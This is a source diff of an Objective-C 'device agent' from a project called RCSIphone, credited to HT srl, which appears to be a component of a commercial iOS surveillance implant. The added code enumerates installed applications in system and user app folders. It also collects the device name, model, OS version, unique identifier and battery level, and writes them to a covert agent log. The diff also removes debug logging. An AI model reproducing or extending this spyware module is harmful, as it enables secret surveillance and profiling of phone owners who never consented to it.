@@ -3,85 +3,52 @@
 //  RCSIphone
 //
 //  Created by kiodo on 3/11/11.
-//  Copyright 2011 __MyCompanyName__. All rights reserved.
+//  Copyright 2011 HT srl. All rights reserved.
 //
 #import "RCSIAgentDevice.h"
 #import "RCSICommon.h"
-#import "RCSITaskManager.h"
 
 //#define DEBUG_DEVICE
 
 NSString *kSPHardwareDataType     = @"SPHardwareDataType";
 NSString *kSPApplicationsDataType = @"SPApplicationsDataType";
+NSString *kAppName = @"kAppName";
+#define NL_NL @"\n\t\t"
+#define APPLICATIONS_PATH @"/Applications"
+#define USER_APPLICATIONS_PATH @"/private/var/mobile/Applications"
 
-static RCSIAgentDevice *sharedAgentDevice = nil;
+#define DEVICE_STRING_FMT        @"\nDevice info:\n"  \
+                                  "Name:\t\t%@\n"     \
+                                  "Model:\t\t%@\n"    \
+                                  "System:\t\t%@\n"   \
+                                  "Version:\t\t%@\n"  \
+                                  "UniqID:\t\t%@\n"   \
+                                  "Battery:\t\t%f"
+
+#define DEVICE_STRING_APPS_FMT   @"\nDevice info:\n"  \
+                                  "Name:\t\t%@\n"     \
+                                  "Model:\t\t%@\n"    \
+                                  "System:\t\t%@\n"   \
+                                  "Version:\t\t%@\n"  \
+                                  "UniqID:\t\t%@\n"   \
+                                  "Battery:\t\t%f"    \
+                                  "%@"
 
 @implementation RCSIAgentDevice
-
-@synthesize mAgentConfiguration;
 
 #pragma mark -
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSIAgentDevice *)sharedInstance
+- (id)initWithConfigData:(NSData *)aData
 {
-  @synchronized(self)
-  {
-    if (sharedAgentDevice == nil)
-    {
-      //
-      // Assignment is not done here
-      //
-      [[self alloc] init];
-    }
-  }
+  self = [super initWithConfigData: aData];
   
-  return sharedAgentDevice;
-}
-
-+ (id)allocWithZone: (NSZone *)aZone
-{
-  @synchronized(self)
-  {
-    if (sharedAgentDevice == nil)
-    {
-      sharedAgentDevice = [super allocWithZone: aZone];
-      
-      //
-      // Assignment and return on first allocation
-      //
-      return sharedAgentDevice;
-    }
-  }
+  memcpy(&mAppList,[mAgentConfiguration bytes], sizeof(mAppList));
   
-  // On subsequent allocation attemps return nil
-  return nil;
-}
-
-- (id)copyWithZone: (NSZone *)aZone
-{
-  return self;
-}
-
-- (id)retain
-{
-  return self;
-}
-
-- (unsigned)retainCount
-{
-  // Denotes an object that cannot be released
-  return UINT_MAX;
-}
-
-- (void)release
-{
-  // Do nothing
-}
-
-- (id)autorelease
-{
+  if (self != nil)
+    mAgentID = AGENT_DEVICE;
+  
   return self;
 }
 
@@ -89,40 +56,163 @@ static RCSIAgentDevice *sharedAgentDevice = nil;
 #pragma mark Agent Formal Protocol Methods
 #pragma mark -
 
+- (NSMutableArray*)getAppsNames:(NSArray*)appsPathArray
+{
+  NSRange subrange;
+  subrange.location = 0;
+  
+  NSMutableArray *appArray = [NSMutableArray arrayWithCapacity:0];
+  
+  if (appsPathArray == nil || [self isThreadCancelled] == TRUE)
+    return appArray;
+  
+  for (int j=0; j < [appsPathArray count]; j++)
+    {
+      NSString *tmpAppPath = [appsPathArray objectAtIndex:j];
+    
+      NSRange tmpRange = [tmpAppPath rangeOfString: @".app"];
+    
+      if (tmpRange.location == NSNotFound)
+        continue;
+      else
+        {
+          subrange.length = tmpRange.location;
+          [appArray addObject:[tmpAppPath substringWithRange: subrange]];
+        }
+    }
+  
+  return appArray;
+}
+
+
+- (NSMutableArray*)getAppsNameFromAppFolders
+{
+  NSRange subrange;
+  subrange.location = 0;
+  
+  NSMutableArray *appArray = [NSMutableArray arrayWithCapacity:0];
+  
+  if ([self isThreadCancelled] == TRUE)
+    return appArray;
+  
+  NSFileManager *dflFileMgr = [NSFileManager defaultManager];
+  
+  NSError *err;
+  
+  NSArray *appFirstLevelPath = [dflFileMgr contentsOfDirectoryAtPath: APPLICATIONS_PATH 
+                                                               error: &err];
+  if (appFirstLevelPath == nil)
+    return  appArray;
+  
+  NSMutableArray *theAppArray = [self getAppsNames: appFirstLevelPath];
+  
+  [appArray addObjectsFromArray: theAppArray];
+  
+  NSArray *usrAppFirstLevelPath = [dflFileMgr contentsOfDirectoryAtPath: USER_APPLICATIONS_PATH 
+                                                                  error: &err];
+  
+  if (usrAppFirstLevelPath == nil || [self isThreadCancelled] == TRUE)
+    return  appArray;
+  
+  for (int i=0; i < [usrAppFirstLevelPath count]; i++) 
+    {
+      NSString *tmpPath = [NSString stringWithFormat: @"%@/%@", USER_APPLICATIONS_PATH,
+                                                                [usrAppFirstLevelPath objectAtIndex:i]];
+      
+      NSArray *appSecondLevelPath = [dflFileMgr contentsOfDirectoryAtPath: tmpPath 
+                                                                    error: &err];
+    
+      if (appSecondLevelPath == nil)
+        continue;
+      
+      NSMutableArray *theUserAppArray = [self getAppsNames: appSecondLevelPath];
+    
+      [appArray addObjectsFromArray: theUserAppArray];   
+    }
+  
+  return appArray;
+}
+
+- (NSMutableString*)getInstalledApp
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  if ([self isThreadCancelled] == TRUE)
+    { 
+      [pool release];
+      return nil;
+    }
+    
+  NSMutableArray *appPathNames = [self getAppsNameFromAppFolders];
+  
+  NSMutableString *apps = [[NSMutableString alloc] initWithCapacity:0];
+  
+  [apps appendString: @"\n\n Installed applications:\n"];
+  [apps appendString: NL_NL];
+  
+  for (int i=0; i < [appPathNames count]; i++) 
+    {
+      if ([self isThreadCancelled] == TRUE)
+        { 
+          [pool release];
+          return apps;
+        }
+    
+      id appPath = [appPathNames objectAtIndex:i];
+      [apps appendString: appPath];
+      [apps appendString: NL_NL];
+    }
+  
+  [pool release];
+  
+  return apps;
+}
+
 - (NSData*)getSystemInfoWithType: (NSString*)aType
 {
   NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
   
+  NSMutableString *apps = nil;
   NSData *retData = nil;
-  NSString *systemInfoStr = nil;
- 
+  NSMutableString *systemInfoStr = nil;
+  
+  if ([self isThreadCancelled] == TRUE)
+    {
+      [pool release];
+      return retData;
+    }
+  
   UIDevice *device = [UIDevice currentDevice];
-  
-#ifdef DEBUG_TMP
-  NSLog(@"%s: device %@ %@ %@ %@ %@ major(%@)", 
-        __FUNCTION__, 
-        [device name],
-        [device model],
-        [device uniqueIdentifier],
-        [device systemVersion],
-        [device systemName]);
-#endif
-  
+    
   device.batteryMonitoringEnabled = YES;
   
-  systemInfoStr = [[NSString alloc] initWithFormat: @"\nDevice info:\nName:\t\t%@\nModel:\t\t%@\nSystem:\t\t%@\nVersion:\t\t%@\nUniqID:\t\t%@\nBattery:\t\t%f",
-                   [device name],
-                   [device model],
-                   [device systemName],
-                   [device systemVersion],
-                   [device uniqueIdentifier],
-                   [device batteryLevel]];
-
-  retData = [[systemInfoStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding] retain];
+  if (mAppList == TRUE)
+    apps = [self getInstalledApp];
   
-#ifdef  DEBUG_DEVICE
-    NSLog(@"%s: HW INFO retData %@", __FUNCTION__, retData);
-#endif
+  if (apps == nil)
+    {
+      systemInfoStr = [[NSString alloc] initWithFormat: DEVICE_STRING_FMT,
+                       [device name],
+                       [device model],
+                       [device systemName],
+                       [device systemVersion],
+                       [device uniqueIdentifier],
+                       [device batteryLevel]];
+    }
+  else
+    {
+      systemInfoStr = [[NSString alloc] initWithFormat: DEVICE_STRING_APPS_FMT,
+                       [device name],
+                       [device model],
+                       [device systemName],
+                       [device systemVersion],
+                       [device uniqueIdentifier],
+                       [device batteryLevel],
+                       apps];
+      [apps release];
+    }
+  
+  retData = [[systemInfoStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding] retain];
   
   [systemInfoStr release];
 
@@ -148,9 +238,6 @@ static RCSIAgentDevice *sharedAgentDevice = nil;
   BOOL success = [logManager createLog: LOGTYPE_DEVICE
                            agentHeader: nil
                              withLogID: 0];
-#ifdef DEBUG_DEVICE
-  NSLog(@"%s: writing log", __FUNCTION__);
-#endif 
   
   if (success == TRUE)
   {
@@ -173,22 +260,12 @@ static RCSIAgentDevice *sharedAgentDevice = nil;
       [nullInfo release];
     }
     
-#ifdef DEBUG_DEVICE
-    NSLog(@"%s: tmpData %@", __FUNCTION__, tmpData);
-#endif
-    
     [logManager writeDataToLog: tmpData
                       forAgent: LOGTYPE_DEVICE
                      withLogID: 0];
     
     [logManager closeActiveLog: LOGTYPE_DEVICE
                      withLogID: 0];
-  }
-  else
-  {
-#ifdef DEBUG_DEVICE
-    NSLog(@"%s: error creating logs", __FUNCTION__);
-#endif
   }
   
   [pool release];
@@ -200,61 +277,52 @@ static RCSIAgentDevice *sharedAgentDevice = nil;
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  NSData *infoStr = [self getSystemInfoWithType: kSPHardwareDataType];
+  if ([self isThreadCancelled] == TRUE)
+    {
+      [pool release];
+      return FALSE;
+    }
   
-  if (infoStr != nil)
-    [self writeDeviceInfo: infoStr];
+  NSData *infoData = [self getSystemInfoWithType: kSPHardwareDataType];
   
-  [infoStr release];
+  if ([self isThreadCancelled] == TRUE)
+    {
+      [infoData release];
+      [pool release];
+      return FALSE;
+    }
+  
+  if (infoData != nil)
+    [self writeDeviceInfo: infoData];
+  
+  [infoData release];
   
   [pool release];
   
   return YES;
 }
 
-- (void)start
+- (void)startAgent
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-#ifdef DEBUG_DEVICE
-  NSLog(@"%s: Agent device started", __FUNCTION__);
-#endif
-  
-  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
-  
-  if ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
-      [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
-  {
-    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+ 
+  if ([self mAgentStatus] != AGENT_STATUS_STOPPED || [self isThreadCancelled] == TRUE)
+    {
+      [self setMAgentStatus:AGENT_STATUS_STOPPED];
+      [outerPool release];
+      return;
+    }
 
-    [self getDeviceInfo];
+  [self getDeviceInfo];
     
-    [innerPool release];
-  }
-
-    [mAgentConfiguration setObject: AGENT_STOPPED
-                            forKey: @"status"];
-  
-  [mAgentConfiguration release];
-  mAgentConfiguration = nil;
+  [self setMAgentStatus:AGENT_STATUS_STOPPED];
   
   [outerPool release];
 }
 
-- (BOOL)stop
+- (BOOL)stopAgent
 {
-  int internalCounter = 0;
-  
-  [mAgentConfiguration setObject: AGENT_STOP
-                          forKey: @"status"];
-  
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
-         && internalCounter <= 5)
-  {
-    internalCounter++;
-    sleep(1);
-  }
-  
+  [self setMAgentStatus: AGENT_STATUS_STOPPING];
   return YES;
 }
 
@@ -262,9 +330,5 @@ static RCSIAgentDevice *sharedAgentDevice = nil;
 {
   return YES;
 }
-
-#pragma mark -
-#pragma mark Getter/Setter
-#pragma mark -
 
 @end
